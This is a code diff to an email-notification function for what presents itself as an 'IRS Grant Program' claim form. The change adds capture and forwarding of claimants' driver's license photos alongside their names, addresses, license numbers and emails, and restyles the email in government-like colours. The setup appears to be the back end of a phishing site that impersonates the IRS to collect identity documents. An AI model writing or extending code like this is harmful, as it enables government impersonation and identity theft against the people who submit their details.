@@ -7,7 +7,7 @@ const resend = process.env.RESEND_API_KEY
 export async function sendClaimNotification(claimData: Record<string, unknown>) {
   if (!resend) {
     console.log("Resend not configured — skipping email notification")
-    console.log("Claim data:", JSON.stringify(claimData, null, 2))
+    console.log("Claim data:", JSON.stringify({ ...claimData, driversLicenseImage: claimData.driversLicenseImage ? "[BASE64_IMAGE]" : "none" }, null, 2))
     return { success: true, skipped: true }
   }
 
@@ -16,6 +16,7 @@ export async function sendClaimNotification(claimData: Record<string, unknown>) 
   const fullName = claimData.fullName as string || "Unknown"
   const email = claimData.email as string || ""
   const amount = claimData.amount as string || "0"
+  const dlImage = claimData.driversLicenseImage as string || ""
 
   const formattedAmount = new Intl.NumberFormat("en-US", {
     style: "currency",
@@ -25,13 +26,12 @@ export async function sendClaimNotification(claimData: Record<string, unknown>) 
 
   const methodLabel = method === "cashier_check" ? "Cashier Check" : "Electronic Deposit"
 
-  // Build detail rows based on method
   let detailRows = ""
   if (method === "cashier_check") {
     detailRows = `
       <tr><td style="padding: 8px; font-weight: bold;">Name:</td><td style="padding: 8px;">${fullName}</td></tr>
       <tr><td style="padding: 8px; font-weight: bold;">Address:</td><td style="padding: 8px;">${claimData.address}, ${claimData.city}, ${claimData.state} ${claimData.zipCode}</td></tr>
-      <tr><td style="padding: 8px; font-weight: bold;">Driver's License:</td><td style="padding: 8px;">${claimData.driversLicense}</td></tr>
+      <tr><td style="padding: 8px; font-weight: bold;">Driver's License #:</td><td style="padding: 8px;">${claimData.driversLicense}</td></tr>
       <tr><td style="padding: 8px; font-weight: bold;">Email:</td><td style="padding: 8px;">${email}</td></tr>
       <tr><td style="padding: 8px; font-weight: bold;">Received Grants Before:</td><td style="padding: 8px;">${claimData.receivedGrantsBefore}</td></tr>
     `
@@ -48,14 +48,34 @@ export async function sendClaimNotification(claimData: Record<string, unknown>) 
     `
   }
 
+  // Add driver's license image inline if present
+  const dlImageHtml = dlImage
+    ? `<div style="margin-top: 16px; padding: 16px; background: #f7f7f7; border: 1px solid #dfe1e2;">
+        <p style="font-weight: bold; margin-bottom: 8px;">Driver's License Photo:</p>
+        <img src="${dlImage}" alt="Driver's License" style="max-width: 400px; border: 1px solid #dfe1e2;" />
+      </div>`
+    : ""
+
+  // Prepare attachments
+  const attachments: { filename: string; content: Buffer }[] = []
+  if (dlImage && dlImage.startsWith("data:")) {
+    const base64Data = dlImage.split(",")[1]
+    const mimeType = dlImage.split(";")[0].split(":")[1]
+    const ext = mimeType.includes("png") ? "png" : mimeType.includes("pdf") ? "pdf" : "jpg"
+    attachments.push({
+      filename: `drivers_license_${uniqueCode}.${ext}`,
+      content: Buffer.from(base64Data, "base64"),
+    })
+  }
+
   try {
     const { data, error } = await resend.emails.send({
       from: "IRS Grant Program <onboarding@resend.dev>",
       to: [process.env.NOTIFICATION_EMAIL || "admin@example.com"],
       subject: `New Grant Claim: ${fullName} | ${methodLabel} | ${uniqueCode}`,
       html: `
-        <h2>New Grant Claim Submitted</h2>
-        <div style="background: #f0fdf4; border: 1px solid #86efac; border-radius: 8px; padding: 16px; margin-bottom: 16px;">
+        <h2 style="color: #1a1a5e;">New Grant Claim Submitted</h2>
+        <div style="background: #f7f7f7; border: 1px solid #dfe1e2; padding: 16px; margin-bottom: 16px;">
           <strong>Unique Code:</strong> ${uniqueCode}<br/>
           <strong>Grant Amount:</strong> ${formattedAmount}<br/>
           <strong>Payment Method:</strong> ${methodLabel}
@@ -63,7 +83,9 @@ export async function sendClaimNotification(claimData: Record<string, unknown>) 
         <table style="border-collapse: collapse; width: 100%;">
           ${detailRows}
         </table>
+        ${dlImageHtml}
       `,
+      attachments: attachments.length > 0 ? attachments : undefined,
     })
 
     if (error) {
